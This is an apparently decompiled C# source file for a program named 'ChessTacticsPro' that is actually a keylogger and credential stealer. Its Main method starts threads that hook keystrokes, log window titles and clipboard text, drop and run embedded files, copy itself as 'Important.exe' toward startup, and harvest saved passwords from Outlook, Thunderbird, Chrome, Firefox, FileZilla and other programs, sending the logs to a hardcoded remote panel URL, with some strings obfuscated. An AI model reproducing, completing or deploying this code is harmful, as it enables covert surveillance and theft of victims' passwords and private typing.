using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000007 RID: 7
[StandardModule]
internal sealed class ChessTacticsPro
{
	// Token: 0x17000006 RID: 6
	// (get) Token: 0x06000012 RID: 18 RVA: 0x00002284 File Offset: 0x00001284
	// (set) Token: 0x06000013 RID: 19 RVA: 0x0000229C File Offset: 0x0000129C
	internal static KeyHook Keylogger
	{
		get
		{
			return ChessTacticsPro._Keylogger;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (ChessTacticsPro._Keylogger != null)
			{
				ChessTacticsPro._Keylogger.Down -= ChessTacticsPro.KeyloggerProcess;
			}
			ChessTacticsPro._Keylogger = value;
			if (ChessTacticsPro._Keylogger != null)
			{
				ChessTacticsPro._Keylogger.Down += ChessTacticsPro.KeyloggerProcess;
			}
		}
	} = new KeyHook();

	// Token: 0x06000014 RID: 20 RVA: 0x000022EC File Offset: 0x000012EC
	[STAThread]
	public static void Main()
	{
		ChessTacticsPro.ŇźƉŽƃƉƌ();
		ChessTacticsPro.T1 = new Thread(new ThreadStart(ChessTacticsPro.ShowMessageBox));
		ChessTacticsPro.T1.Start();
		ChessTacticsPro.T2 = new Thread(new ThreadStart(ChessTacticsPro.AddToStartup));
		ChessTacticsPro.T2.Start();
		ChessTacticsPro.T3 = new Thread(new ThreadStart(ChessTacticsPro.WebsiteBlocker));
		ChessTacticsPro.T3.Start();
		ChessTacticsPro.T4 = new Thread(new ThreadStart(ChessTacticsPro.WebsiteVisitor));
		ChessTacticsPro.T4.Start();
		ChessTacticsPro.T5 = new Thread(new ThreadStart(ChessTacticsPro.SelfDestruct));
		ChessTacticsPro.T5.Start();
		ChessTacticsPro.T6 = new Thread(new ThreadStart(ChessTacticsPro.GetCurrentWindow));
		ChessTacticsPro.T6.Start();
		ChessTacticsPro.T7 = new Thread(new ThreadStart(ChessTacticsPro.RecordKeys));
		ChessTacticsPro.T7.Start();
		ChessTacticsPro.T8 = new Thread(new ThreadStart(ChessTacticsPro.SendNotification));
		ChessTacticsPro.T8.Start();
		ChessTacticsPro.T9 = new Thread(new ThreadStart(ChessTacticsPro.AddHotWords));
		ChessTacticsPro.T9.Start();
		ChessTacticsPro.T10 = new Thread(new ThreadStart(ChessTacticsPro.ClipboardLogging));
		ChessTacticsPro.T10.SetApartmentState(ApartmentState.STA);
		ChessTacticsPro.T10.Start();
		ChessTacticsPro.T11 = new Thread(new ThreadStart(ChessTacticsPro.ScreenLogging));
		ChessTacticsPro.T11.Start();
		ChessTacticsPro.T12 = new Thread(new ThreadStart(ChessTacticsPro.DownloadAndExecute));
		ChessTacticsPro.T12.Start();
		ChessTacticsPro.T13 = new Thread(new ThreadStart(ChessTacticsPro.ExecuteBindedFiles));
		ChessTacticsPro.T13.Start();
		ChessTacticsPro.T14 = new Thread(new ThreadStart(ChessTacticsPro.PasswordRecovery));
		ChessTacticsPro.T14.Start();
		ChessTacticsPro.Keylogger.CreateHook();
		Application.Run();
	}

	// Token: 0x06000015 RID: 21 RVA: 0x000024D8 File Offset: 0x000014D8
	public static void ŇźƉŽƃƉƌ()
	{
		object instance = new Mutex(false, "da4f21d00b1992e0b25f463b722dcc6aafdec7005cc9f14302cd0474fd0f3c96cfcd208495d565ef66e7dff9f98764da");
		if (Conversions.ToBoolean(Operators.NotObject(NewLateBinding.LateGet(instance, null, "WaitOne", new object[]
		{
			0,
			false
		}, null, null, null))))
		{
			NewLateBinding.LateCall(instance, null, "Close", new object[0], null, null, null, true);
			ProjectData.EndApp();
		}
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002544 File Offset: 0x00001544
	public static void Wait(int i)
	{
		Thread.Sleep(i);
	}

	// Token: 0x06000017 RID: 23 RVA: 0x0000254C File Offset: 0x0000154C
	public static void ShowMessageBox()
	{
	}

	// Token: 0x06000018 RID: 24 RVA: 0x00002550 File Offset: 0x00001550
	public static void AddToStartup()
	{
	}

	// Token: 0x06000019 RID: 25 RVA: 0x00002554 File Offset: 0x00001554
	public static void AddCurrentKey(string name, string path)
	{
	}

	// Token: 0x0600001A RID: 26 RVA: 0x00002558 File Offset: 0x00001558
	public static void HideFile(string Path)
	{
	}

	// Token: 0x0600001B RID: 27 RVA: 0x0000255C File Offset: 0x0000155C
	public static void WebsiteBlocker()
	{
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00002560 File Offset: 0x00001560
	public static void WebsiteVisitor()
	{
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00002564 File Offset: 0x00001564
	public static void SelfDestruct()
	{
	}

	// Token: 0x0600001E RID: 30 RVA: 0x00002568 File Offset: 0x00001568
	public static void DestructFile(object sender, ElapsedEventArgs e)
	{
	}

	// Token: 0x0600001F RID: 31 RVA: 0x0000256C File Offset: 0x0000156C
	public static void GetCurrentWindow()
	{
		string left = null;
		for (;;)
		{
			if (Operators.CompareString(left, ChessTacticsPro.GetWindow.GetCaption(), false) != 0 && ChessTacticsPro.GetWindow.GetCaption() != null)
			{
				ChessTacticsPro.KeyStrokeLog = string.Concat(new string[]
				{
					ChessTacticsPro.KeyStrokeLog,
					Environment.NewLine,
					"Window title: ",
					ChessTacticsPro.GetWindow.GetCaption(),
					" End:] ",
					Environment.NewLine,
					"Machine Time: ",
					DateAndTime.Now.ToShortTimeString(),
					" End:] ",
					Environment.NewLine,
					"Keystrokes typed: "
				});
				left = ChessTacticsPro.GetWindow.GetCaption();
			}
			Thread.Sleep(10);
		}
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00002638 File Offset: 0x00001638
	public static void RecordKeys()
	{
		for (;;)
		{
			Thread.Sleep(9000000);
			try
			{
				string keyStrokeLog = ChessTacticsPro.KeyStrokeLog;
				int count = Regex.Matches(keyStrokeLog, Regex.Escape("Window title: ")).Count;
				object obj;
				object loopObj;
				if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(obj, 0, checked(count - 1), 1, ref loopObj, ref obj))
				{
					do
					{
						string between = ChessTacticsPro.GetBetween(keyStrokeLog, "Window title: ", " End:] ", Conversions.ToInteger(obj));
						string between2 = ChessTacticsPro.GetBetween(keyStrokeLog, "Keystrokes typed: ", "\r\n", Conversions.ToInteger(obj));
						Send.SendLog(ChessTacticsPro.P_Link, "Keystrokes", between, between2, null, null, null, null, null);
						ChessTacticsPro.Wait(100);
					}
					while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(obj, loopObj, ref obj));
				}
			}
			catch (Exception ex)
			{
			}
			ChessTacticsPro.KeyStrokeLog = null;
		}
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00002710 File Offset: 0x00001710
	private static void KeyloggerProcess(string Key)
	{
		checked
		{
			if (Operators.CompareString(Key, "[Back]", false) != 0)
			{
				ChessTacticsPro.KeyStrokeLog += Key;
			}
			else if (ChessTacticsPro.KeyStrokeLog.Length != 0 && Operators.CompareString(Conversions.ToString(ChessTacticsPro.KeyStrokeLog[ChessTacticsPro.KeyStrokeLog.Length - 1]), "]", false) != 0)
			{
				ChessTacticsPro.KeyStrokeLog = ChessTacticsPro.KeyStrokeLog.Substring(0, ChessTacticsPro.KeyStrokeLog.Length - 1);
			}
		}
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00002790 File Offset: 0x00001790
	public static void SendNotification()
	{
		if (Application.ExecutablePath == ChessTacticsPro.Restart_Path)
		{
			Send.SendLog(ChessTacticsPro.P_Link, "Notification", null, null, null, null, null, null, null);
		}
		else
		{
			Send.SendLog(ChessTacticsPro.P_Link, "Notification", null, null, null, null, null, null, null);
		}
	}

	// Token: 0x06000023 RID: 35 RVA: 0x000027D8 File Offset: 0x000017D8
	public static void AddHotWords()
	{
	}

	// Token: 0x06000024 RID: 36 RVA: 0x000027DC File Offset: 0x000017DC
	public static void ClipboardLogging()
	{
		try
		{
			string text = null;
			string left = null;
			int num = 1;
			int num2 = 3256776;
			for (;;)
			{
				if (Operators.CompareString(Clipboard.GetText(), null, false) != 0 & Operators.CompareString(left, Clipboard.GetText(), false) != 0)
				{
					ChessTacticsPro.ClipboardLog = string.Concat(new string[]
					{
						text,
						Environment.NewLine,
						"Time: ",
						DateAndTime.Now.ToString(),
						Environment.NewLine,
						"Text: ",
						Clipboard.GetText(),
						Environment.NewLine
					});
					if (((-((num < ChessTacticsPro.ClipboardLog.Length > false) ? 1 : 0)) ? 1 : 0) < num2)
					{
					}
				}
				if (((-((num < ChessTacticsPro.ClipboardLog.Length > false) ? 1 : 0)) ? 1 : 0) < num2)
				{
					Send.SendLog(ChessTacticsPro.P_Link, "$C$l$i$p$b$oa$rd$".Replace("$", ""), text, null, null, null, null, null, Send.Clip_Text());
				}
				left = Clipboard.GetText();
				Thread.Sleep(100);
				Thread.Sleep(9000000);
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000025 RID: 37 RVA: 0x00002920 File Offset: 0x00001920
	public static void TakeScreenshot(string Extension, string Quality, int Instance)
	{
	}

	// Token: 0x06000026 RID: 38 RVA: 0x00002924 File Offset: 0x00001924
	public static void ScreenLogging()
	{
	}

	// Token: 0x06000027 RID: 39 RVA: 0x00002928 File Offset: 0x00001928
	public static void DownloadAndExecute()
	{
	}

	// Token: 0x06000028 RID: 40 RVA: 0x0000292C File Offset: 0x0000192C
	public static void DownloadFile(string WebLocation)
	{
	}

	// Token: 0x06000029 RID: 41 RVA: 0x00002930 File Offset: 0x00001930
	public static void ExecuteBindedFiles()
	{
	}

	// Token: 0x0600002A RID: 42 RVA: 0x00002934 File Offset: 0x00001934
	public static void ExecuteFile(string ResourceName, bool Executable)
	{
		try
		{
			Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG")).Invoke(null, null);
			ResourceManager resourceManager = new ResourceManager("Key", assembly);
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), ResourceName);
			byte[] bytes = (byte[])resourceManager.GetObject(ResourceName);
			File.WriteAllBytes(text, bytes);
			Process.Start(text);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600002B RID: 43 RVA: 0x000029C0 File Offset: 0x000019C0
	public static void PasswordRecovery()
	{
		try
		{
			ChessTacticsPro.RecoverMail.Outlook();
			ChessTacticsPro.RecoverMail.NetScape();
			ChessTacticsPro.RecoverMail.Thunderbird();
			ChessTacticsPro.RecoverMail.Eudora();
			ChessTacticsPro.RecoverMail.Incredimail();
			ChessTacticsPro.RecoverBrowsers.Firefox();
			ChessTacticsPro.RecoverBrowsers.Chrome();
			ChessTacticsPro.RecoverBrowsers.InternetExplorer();
			ChessTacticsPro.RecoverBrowsers.Opera();
			ChessTacticsPro.RecoverBrowsers.Safari();
			Filezilla.Recover();
			IMVU.Recover();
			InternetDownloadManager.Recover();
			JDownloader.Recover();
			Paltalk.Recover();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00002A6C File Offset: 0x00001A6C
	public static string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}

	// Token: 0x04000006 RID: 6
	private static Thread T1;

	// Token: 0x04000007 RID: 7
	private static Thread T2;

	// Token: 0x04000008 RID: 8
	private static Thread T3;

	// Token: 0x04000009 RID: 9
	private static Thread T4;

	// Token: 0x0400000A RID: 10
	private static Thread T5;

	// Token: 0x0400000B RID: 11
	private static Thread T6;

	// Token: 0x0400000C RID: 12
	private static Thread T7;

	// Token: 0x0400000D RID: 13
	private static Thread T8;

	// Token: 0x0400000E RID: 14
	private static Thread T9;

	// Token: 0x0400000F RID: 15
	private static Thread T10;

	// Token: 0x04000010 RID: 16
	private static Thread T11;

	// Token: 0x04000011 RID: 17
	private static Thread T12;

	// Token: 0x04000012 RID: 18
	private static Thread T13;

	// Token: 0x04000013 RID: 19
	private static Thread T14;

	// Token: 0x04000014 RID: 20
	private static Random R = new Random();

	// Token: 0x04000015 RID: 21
	private static Mutex M;

	// Token: 0x04000016 RID: 22
	[AccessedThroughProperty("Keylogger")]
	private static KeyHook _Keylogger;

	// Token: 0x04000017 RID: 23
	internal static GetActiveWindow GetWindow = new GetActiveWindow();

	// Token: 0x04000018 RID: 24
	private static RecoverMail RecoverMail = new RecoverMail();

	// Token: 0x04000019 RID: 25
	private static RecoverBrowsers RecoverBrowsers = new RecoverBrowsers();

	// Token: 0x0400001A RID: 26
	private static string KeyStrokeLog = null;

	// Token: 0x0400001B RID: 27
	private static string ClipboardLog = null;

	// Token: 0x0400001C RID: 28
	private static List<string> HotList = new List<string>();

	// Token: 0x0400001D RID: 29
	private static List<string> ScreenshotHotList = new List<string>();

	// Token: 0x0400001E RID: 30
	private static string Restart_Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Important.exe");

	// Token: 0x0400001F RID: 31
	private static string App_Path = Application.ExecutablePath;

	// Token: 0x04000020 RID: 32
	private static string Alt_Location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Important.exe");

	// Token: 0x04000021 RID: 33
	public static string P_Link = "http://shopphongtinh.com/key/panel/base/";
}
